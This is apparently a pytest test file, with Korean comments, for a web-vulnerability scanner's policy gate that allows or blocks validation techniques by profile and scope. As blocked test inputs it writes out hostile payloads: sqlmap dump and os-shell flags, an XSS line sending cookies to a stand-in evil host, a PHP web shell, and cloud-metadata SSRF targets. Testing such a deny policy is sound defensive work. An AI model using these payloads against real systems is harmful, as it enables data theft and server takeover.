"""test_proof_validation.py — Proof-Oriented Validation Framework v1 (SAFE 기본·차단 정책)."""
import os, sys, io
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import importlib
import validation_profiles as vp
import proof_policy as pp
import proof_validation as pvd
import evidence_levels as evl


def _reload_profiles(monkeypatch, **env):
    for k in ("VALIDATION_PROFILE", "ALLOW_ADVANCED_VALIDATION", "ALLOW_PROOF_MODE",
              "SQLMAP_ALLOW_TIME_BASED", "PROOF_MAX_ACTIONS"):
        monkeypatch.delenv(k, raising=False)
    for k, v in env.items():
        monkeypatch.setenv(k, v)


# ── 1. SAFE 기본값 ────────────────────────────────────────────────────────────
def test_default_profile_is_safe(monkeypatch):
    _reload_profiles(monkeypatch)
    assert vp.current_profile() == "SAFE"
    assert vp.DEFAULT == "SAFE"
    assert vp.allow_advanced() is False and vp.allow_proof() is False


def test_profile_escalation_requires_approval(monkeypatch):
    # 사용자 결정: PROOF 게이트만 유지, ADVANCED 게이트 제거.
    # PROOF 요청이 승인 없으면 ADVANCED 로 강등(더 이상 STANDARD 로 내려가지 않음)
    _reload_profiles(monkeypatch, VALIDATION_PROFILE="PROOF")
    assert vp.current_profile() == "ADVANCED"   # proof 미승인 → ADVANCED
    assert vp.was_downgraded() is True
    # ADVANCED 는 별도 승인 없이도 유지
    _reload_profiles(monkeypatch, VALIDATION_PROFILE="ADVANCED")
    assert vp.current_profile() == "ADVANCED"
    # PROOF 는 ALLOW_PROOF_MODE=true 일 때만 유지
    _reload_profiles(monkeypatch, VALIDATION_PROFILE="PROOF", ALLOW_PROOF_MODE="true")
    assert vp.current_profile() == "PROOF"


def test_unknown_profile_falls_back_safe(monkeypatch):
    _reload_profiles(monkeypatch, VALIDATION_PROFILE="ATTACK_ALL")
    assert vp.current_profile() == "SAFE"


# ── 2. Proof Policy Gate: 프로파일별 허용/차단 ────────────────────────────────
def test_profile_gates_techniques():
    # boolean_diff 는 STANDARD 이상, sqlmap_injectable 은 PROOF
    assert pp.evaluate({"family": "sqli", "technique": "boolean_diff",
                        "target": "http://ok.example.com/"},
                       profile="SAFE", scope=["ok.example.com"])["decision"] == pp.BLOCKED_BY_PROFILE
    assert pp.evaluate({"family": "sqli", "technique": "boolean_diff",
                        "target": "http://ok.example.com/"},
                       profile="STANDARD", scope=["ok.example.com"])["decision"] == pp.ALLOWED


# ── 3. SQLi Proof: dump/os-shell/file-read 차단, metadata 허용 ─────────────────
def test_sqli_dump_and_shell_blocked():
    assert pp.evaluate({"family": "sqli", "technique": "full_dump", "payload": "--dump-all",
                        "data_scope": "full"})["decision"] == pp.BLOCKED_DATA_EXFILTRATION
    assert pp.evaluate({"family": "sqli", "technique": "os_shell",
                        "payload": "--os-shell"})["decision"] == pp.BLOCKED_SHELL
    assert pp.evaluate({"family": "sqli", "technique": "cred_extract",
                        "payload": "select password from users",
                        "data_scope": "records"})["decision"] == pp.BLOCKED_DATA_EXFILTRATION


def test_sqli_readonly_metadata_allowed(monkeypatch):
    _reload_profiles(monkeypatch, VALIDATION_PROFILE="PROOF",
                     ALLOW_ADVANCED_VALIDATION="true", ALLOW_PROOF_MODE="true")
    r = pp.evaluate({"family": "sqli", "technique": "readonly_metadata", "data_scope": "metadata",
                     "target": "http://ok.example.com/"}, profile="PROOF", scope=["ok.example.com"],
                    approved=True)
    assert r["decision"] == pp.ALLOWED


# ── 4. XSS Proof: 외부 전송 차단, browser 증거 허용 ───────────────────────────
def test_xss_exfil_blocked_alert_allowed():
    assert pp.evaluate({"family": "xss", "technique": "session_exfil",
                        "payload": "new Image().src='//evil/'+document.cookie"})["decision"] \
        == pp.BLOCKED_DATA_EXFILTRATION
    assert pp.evaluate({"family": "xss", "technique": "browser_alert",
                        "payload": "<script>alert(1)</script>", "target": "http://ok.example.com/"},
                       profile="STANDARD", scope=["ok.example.com"])["decision"] == pp.ALLOWED


# ── 5. IDOR Proof: read-only 교차 허용, 상태 변경 차단 ────────────────────────
def test_idor_readonly_vs_state_change():
    assert pp.evaluate({"family": "idor", "technique": "cross_account_read", "method": "GET",
                        "target": "http://ok.example.com/api/o/1"},
                       profile="STANDARD", scope=["ok.example.com"])["decision"] == pp.ALLOWED
    assert pp.evaluate({"family": "idor", "technique": "state_change", "method": "DELETE",
                        "changes_state": True})["decision"] == pp.BLOCKED_STATE_CHANGE


# ── 6. SSRF: 내부망 차단, controlled callback 허용 ────────────────────────────
def test_ssrf_internal_blocked_callback_allowed():
    assert pp.evaluate({"family": "ssrf", "technique": "cloud_metadata",
                        "target": "http://169.254.169.254/latest/meta-data/",
                        "internal_target": True})["decision"] == pp.BLOCKED_BY_SCOPE
    assert pp.evaluate({"family": "ssrf", "technique": "internal_scan",
                        "target": "http://127.0.0.1/"})["decision"] == pp.BLOCKED_BY_SCOPE
    assert pp.evaluate({"family": "ssrf", "technique": "controlled_callback",
                        "target": "http://cb.example.com/"},
                       profile="ADVANCED", scope=["cb.example.com"])["decision"] == pp.ALLOWED


# ── 7. File Upload: 웹쉘 차단, 무해 marker 허용 ───────────────────────────────
def test_file_upload_webshell_blocked_benign_allowed():
    assert pp.evaluate({"family": "file_upload", "technique": "webshell",
                        "payload": "<?php system($_GET['c']); ?>",
                        "writes_file": True})["decision"] in (pp.BLOCKED_SHELL, pp.BLOCKED_DESTRUCTIVE)
    r = pp.evaluate({"family": "file_upload", "technique": "benign_marker_upload",
                     "target": "http://ok.example.com/upload", "method": "POST"},
                    profile="ADVANCED", scope=["ok.example.com"])
    assert r["decision"] == pp.ALLOWED   # 업로드는 file_upload 계열 상태변경 예외


# ── 8. Open Redirect: 안전 도메인 허용, 악성 차단 ────────────────────────────
def test_open_redirect_controlled_allowed():
    assert pp.evaluate({"family": "open_redirect", "technique": "controlled_safe_redirect",
                        "target": "http://ok.example.com/r", "payload": "//example.com"},
                       profile="STANDARD", scope=["ok.example.com"])["decision"] == pp.ALLOWED


# ── 9. Service Proof: read-only 제한 ──────────────────────────────────────────
def test_service_readonly_restrictions():
    # brute force / credential stuffing 은 항상 차단
    assert pp.evaluate({"family": "service", "technique": "brute_force",
                        "payload": "credential stuffing"})["decision"] in pp.BLOCKED_DECISIONS
    # 배너 관찰은 SAFE 에서도 허용
    assert pp.evaluate({"family": "service", "technique": "banner_observe",
                        "target": "http://ok.example.com/"},
                       profile="SAFE", scope=["ok.example.com"])["decision"] == pp.ALLOWED
    # redis_auth_check 는 ADVANCED 이상
    assert pp.evaluate({"family": "service", "technique": "redis_auth_check",
                        "target": "http://ok.example.com/"},
                       profile="STANDARD", scope=["ok.example.com"])["decision"] == pp.BLOCKED_BY_PROFILE


# ── 10. Scope 밖 대상 차단 ────────────────────────────────────────────────────
def test_out_of_scope_blocked():
    assert pp.evaluate({"family": "xss", "technique": "browser_alert",
                        "target": "http://not-approved.evil.com/"},
                       profile="STANDARD", scope=["ok.example.com"])["decision"] == pp.BLOCKED_BY_SCOPE


# ── 11. Evidence Level 은 Rule Engine 만 변경 (본 모듈은 변경 안 함) ──────────
def test_evidence_level_only_rule_engine(monkeypatch):
    _reload_profiles(monkeypatch)
    f = {"title": "SQLi", "confidence": "CONFIRMED_RESPONSE", "severity": "HIGH", "judgment": "취약"}
    before_conf = f["confidence"]
    rec = pvd.validate_finding(f)
    # 제안 Level 은 Rule Engine(evidence_levels) 판정과 동일, finding 원본 불변
    assert rec["suggested_level"] == evl.level_of(f)
    assert f["confidence"] == before_conf   # 원본 변경 없음
    assert "current_level" in rec


# ── 12. Proof Validation 요약/레코드 산출 ─────────────────────────────────────
def test_run_proof_validation_summary(monkeypatch):
    _reload_profiles(monkeypatch)
    from tests.test_report_v4_ux import _rich
    out = pvd.run_proof_validation(_rich())
    s = out["proof_validation_summary"]
    assert s["profile"] == "SAFE"
    assert s["proof_validations"] == 3
    assert s["blocked_validations"] >= 1     # 위험 행위가 차단됨
    assert "blocked_by_reason" in s
    # 각 레코드에 프로파일/증거/차단 행위 존재
    for r in out["proof_validation"]:
        assert r["profile"] == "SAFE"
        assert "evidence_signals" in r and "blocked_actions" in r


# ── 13. UI/설정 스냅샷 ────────────────────────────────────────────────────────
def test_config_snapshot_defaults(monkeypatch):
    _reload_profiles(monkeypatch)
    snap = vp.config_snapshot()
    assert snap["profile"] == "SAFE" and snap["default"] == "SAFE"
    assert snap["allow_advanced"] is False and snap["allow_proof"] is False
    assert snap["budget"]["sqlmap_allow_time_based"] is False
    assert snap["profiles"] == ["SAFE", "STANDARD", "ADVANCED", "PROOF"]


# ── 14. 보고서 Proof Validation Summary 렌더링 ───────────────────────────────
def test_report_proof_validation_render(monkeypatch):
    _reload_profiles(monkeypatch)
    monkeypatch.setenv("REPORT_SHOW_ENGINE_INTERNAL", "true")   # proof validation 상세는 엔진내부 옵션
    import report
    from docx import Document
    from docx.text.paragraph import Paragraph
    from docx.table import Table
    from tests.test_report_v4_ux import _rich
    a = _rich()
    a.update(pvd.run_proof_validation(a))
    buf = report.generate_report({"domain": "t.example.com", "analysis": a,
                                  "created_at": "2026-07-01", "results": []})
    doc = Document(io.BytesIO(buf.getvalue()))
    parts = []

    def walk(c, p):
        for ch in p:
            if ch.tag.endswith("}p"):
                parts.append(Paragraph(ch, c).text)
            elif ch.tag.endswith("}tbl"):
                for r in Table(ch, c).rows:
                    for cc in r.cells:
                        parts.append(cc.text)
    walk(doc, doc.element.body)
    txt = "\n".join(parts)
    assert "Proof Validation Summary" in txt
    assert "검증 프로파일: SAFE" in txt
    assert "증거 기반 검증 (Proof Validation)" in txt
    assert "안전상 수행하지 않은 위험 행위" in txt
